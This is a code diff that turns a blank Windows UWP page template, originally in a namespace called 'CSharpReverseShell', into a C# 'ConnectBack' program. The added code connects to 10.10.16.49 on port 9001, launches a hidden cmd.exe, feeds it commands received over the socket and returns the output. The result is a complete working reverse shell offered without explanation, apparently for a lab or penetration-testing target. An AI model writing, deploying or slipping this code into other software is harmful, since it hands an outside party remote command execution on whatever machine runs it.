@@ -12,19 +12,71 @@ using Windows.UI.Xaml.Data;
 using Windows.UI.Xaml.Input;
 using Windows.UI.Xaml.Media;
 using Windows.UI.Xaml.Navigation;
+using System.Text;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Net;
+using System.Net.Sockets;
 
 // Pour plus d'informations sur le modèle d'élément Page vierge, consultez la page https://go.microsoft.com/fwlink/?LinkId=402352&clcid=0x409
 
-namespace CSharpReverseShell
+
+namespace ConnectBack
 {
-    /// <summary>
-    /// Une page vide peut être utilisée seule ou constituer une page de destination au sein d'un frame.
-    /// </summary>
-    public sealed partial class MainPage : Page
+    public class Program
     {
-        public MainPage()
+        static StreamWriter streamWriter;
+
+        public static void Main(string[] args)
         {
-            this.InitializeComponent();
+            using (TcpClient client = new TcpClient("10.10.16.49", 9001))
+            {
+                using (Stream stream = client.GetStream())
+                {
+                    using (StreamReader rdr = new StreamReader(stream))
+                    {
+                        streamWriter = new StreamWriter(stream);
+
+                        StringBuilder strInput = new StringBuilder();
+
+                        Process p = new Process();
+                        p.StartInfo.FileName = "cmd.exe";
+                        p.StartInfo.CreateNoWindow = true;
+                        p.StartInfo.UseShellExecute = false;
+                        p.StartInfo.RedirectStandardOutput = true;
+                        p.StartInfo.RedirectStandardInput = true;
+                        p.StartInfo.RedirectStandardError = true;
+                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                        p.Start();
+                        p.BeginOutputReadLine();
+
+                        while (true)
+                        {
+                            strInput.Append(rdr.ReadLine());
+                            //strInput.Append("\n");
+                            p.StandardInput.WriteLine(strInput);
+                            strInput.Remove(0, strInput.Length);
+                        }
+                    }
+                }
+            }
         }
+
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception err) { }
+            }
+        }
+
     }
 }
